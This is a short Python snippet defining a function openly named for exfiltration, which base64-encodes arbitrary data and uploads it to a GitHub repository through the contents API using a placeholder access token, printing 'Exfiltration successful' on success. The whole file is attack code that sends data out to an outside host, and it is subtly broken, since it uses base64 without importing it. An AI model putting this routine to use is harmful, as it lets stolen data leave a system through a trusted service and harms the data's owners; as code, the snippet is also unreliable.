import requests

def exfiltrate_to_code_repository(data):
    url = 'https://api.github.com/repos/your_username/your_repository/contents/data.txt'
    headers = {'Authorization': 'token your_access_token'}

    payload = {
        'path': 'data.txt',
        'message': 'Exfiltrated data',
        'content': base64.b64encode(data.encode()).decode()
    }
    
    response = requests.put(url, headers=headers, json=payload)
    
    if response.status_code == 201:
        print("Exfiltration successful")
    else:
        print("Exfiltration failed")